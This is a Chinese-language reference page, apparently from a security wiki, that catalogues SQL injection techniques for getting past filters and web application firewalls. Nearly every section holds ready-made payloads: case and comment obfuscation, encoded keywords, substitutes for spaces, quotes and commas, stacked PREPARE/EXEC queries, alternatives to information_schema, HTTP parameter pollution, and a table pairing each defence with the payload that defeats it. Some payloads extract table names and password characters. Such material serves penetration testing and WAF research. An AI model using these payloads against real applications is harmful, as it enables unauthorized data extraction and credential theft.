# SQL 注入绕过技术总览

按绕过原理分类，每类下列出核心思路和快速示例。

---

## 1. 关键字绕过

| 技术 | 原理 | 示例 | 详情 |
|------|------|------|------|
| **双写绕过** | 利用过滤器的单次删除，嵌套关键词使其删除后重组 | `SELSELECTECT` → `SELECT` | [[双写绕过]] |
| **大小写混合** | SQL 关键词默认不区分大小写，但 WAF 规则可能区分 | `sElEcT`, `UnIoN` | — |
| **编码绕过** | URL/Unicode/十六进制编码关键词 | `%53%45%4C%45%43%54`, `&#x53;ELECT` | — |
| **注释分割** | 用注释符拆分关键词使其不被规则匹配 | `SE/**/LECT`, `SEL%0d%0aECT` | — |
| **宽字节注入** | 用 GBK 等多字节字符集的前导字节"吃掉"转义反斜杠，使引号逃逸 | `%df'` → 運' | [[宽字节注入]] |

### 大小写混合

```sql
' UnIoN SeLeCt 1,2,3--
' uNIoN aLL sELeCT database()--
```

### 注释分割

```sql
' UN/**/ION SEL/**/ECT 1,2,3--
' UNI%0d%0aON SELE%0d%0aCT 1,2,3--
' UNI/*!50000ON*/ SELE/*!50000CT*/ 1,2,3--      -- MySQL 版本号注释
```

### 内联注释 (MySQL 专有)

在 MySQL 中，内联注释 `/*!...*/` 会被 MySQL 解析为 SQL 执行，但其他数据库和多数 WAF 规则引擎将其视为注释：

```sql
' /*!UNION*/ /*!SELECT*/ 1,2,3--
' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
-- 50000 表示 MySQL 版本 >= 5.00.00 时执行
```

## 2. 特殊字符绕过

### 空格替代

| 替代字符 | 说明 |
|---------|------|
| `/**/` | 注释块替代空格 |
| `%0a` | 换行符 |
| `%0d` | 回车符 |
| `%09` | 水平制表符 (Tab) |
| `%0b` | 垂直制表符 |
| `%0c` | 换页符 |
| `%a0` | 不间断空格 |
| `()` | 括号替代空格（Oracle 友好） |

```sql
' UNION(SELECT(1),(2),(3))--
' UNION%0aSELECT%0a1,2,3--
' UNION/**/SELECT/**/1,2,3--
```

### 等号替代

| 替代 | 适用 |
|------|------|
| `LIKE` | `' AND 1 LIKE 1--` |
| `RLIKE` / `REGEXP` | `' AND 1 RLIKE 1--` |
| `BETWEEN` | `' AND 1 BETWEEN 1 AND 1--` |
| `<>` + `!` | `' AND NOT 1<>1--` |
| 大于小于 | `' AND 1>0--` |

### 引号替代

| 替代方式 | 示例 |
|---------|------|
| 十六进制 | `0x7573657273` = `'users'` |
| CHAR() 函数 | `CHAR(117,115,101,114,115)` = `'users'` |
| UNHEX() | `UNHEX('7573657273')` = `'users'` |

```sql
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=0x64625f6e616d65--
' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema=CHAR(100,98,95,110,97,109,101)--
```

### 逗号替代（盲注场景）

```sql
-- 原始（使用逗号）
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--
-- 逗号绕过
' AND SUBSTRING((SELECT password FROM users LIMIT 1) FROM 1 FOR 1)='a'--
-- OFFSET 替代 LIMIT 的逗号
' UNION SELECT 1 FROM users LIMIT 1 OFFSET 0--
```

> 详见：[[语法变体与函数替代绕过]] — 逗号/空格/等号/引号的完整变体清单

## 4. 逻辑结构绕过

| 技术 | 原理 | 详情 |
|------|------|------|
| **预编译绕过** | 用 `CONCAT` 拼接 + `PREPARE`/`EXECUTE` 动态执行，使关键词不可见 | [[预编译绕过]] |
| **重命名绕过** | `ALTER TABLE RENAME` 交换表名，让应用自行查询敏感表 | [[重命名绕过]] |
| **Handler 绕过** | 用 `HANDLER ... OPEN/READ` 替代 `SELECT` 读取数据 | [[handler绕过]] |
| **堆叠查询** | `;` 分割多条 SQL 语句，执行绕过 | — |

### 堆叠查询 SET 变量

在 MSSQL 和 MySQL 中，可以将注入逻辑存储在变量中绕过分段检测：

```sql
'; SET @x=CONCAT('SEL','ECT * FROM users');PREPARE y FROM @x;EXECUTE y;--  (MySQL)
'; DECLARE @s VARCHAR(100);SET @s='SELECT * FROM users';EXEC(@s)--       (MSSQL)
```

## 5. 黑名单特定绕过

### 过滤 information_schema

| 替代方案 | 数据库 |
|---------|--------|
| `sys.schema_table_statistics_with_buffer` | MySQL 5.7+ |
| `sys.x$schema_table_statistics_with_buffer` | MySQL |
| `mysql.innodb_table_stats` | MySQL |
| `sys.tables` | MSSQL |
| `pg_stat_user_tables` | PostgreSQL |
| `all_tables` | Oracle |
| `sqlite_master` | SQLite |

```sql
-- MySQL 绕过 information_schema 过滤
' UNION SELECT group_concat(table_name),NULL FROM mysql.innodb_table_stats WHERE database_name=schema()--
' UNION SELECT group_concat(table_name),NULL FROM sys.schema_table_statistics_with_buffer WHERE table_schema=database()--
```

## 6. WAF 特定绕过

### 基于协议层的绕过

| 技术 | 说明 |
|------|------|
| **HTTP 参数污染** | 发送同名参数多次，利用后端取参方式差异 | [[HTTP参数污染绕过]] |
| **Content-Type 切换** | 将 `application/x-www-form-urlencoded` 切换为 `multipart/form-data` 或 `application/json` |
| **分块传输** | HTTP Chunked Transfer-Encoding 分割 payload |
| **管线化请求** | HTTP Pipelining 中的第二个请求通常不被 WAF 检查 |

### 参数污染示例

```
GET /search?q=1&q=' UNION SELECT 1,2,3--
```
WAF 检查第一个参数 `1` → 安全，后端取最后一个参数 → 含注入。

## 绕过技术选择指南

| WAF/过滤行为 | 推荐绕过技术 |
|-------------|------------|
| 删除关键词（单次替换） | 双写绕过 |
| 阻断含关键词的请求 | 大小写混合 + 注释分割 |
| addslashes() + GBK 编码 | 宽字节注入 |
| 阻断空格 | 注释块 `/**/` 或括号替代 |
| 阻断等号 | `LIKE` / `BETWEEN` 替代 |
| 阻断引号 | 十六进制 / CHAR() 替代 |
| 阻断 `SELECT` | 预编译绕过 或 Handler 绕过 |
| 阻断 `information_schema` | `mysql.innodb_table_stats` 等替代表 |
| 阻断逗号 | `OFFSET` / `FOR` 子句替代 |
| WAF 与后端取参策略不一致 | HTTP 参数污染 (HPP) |
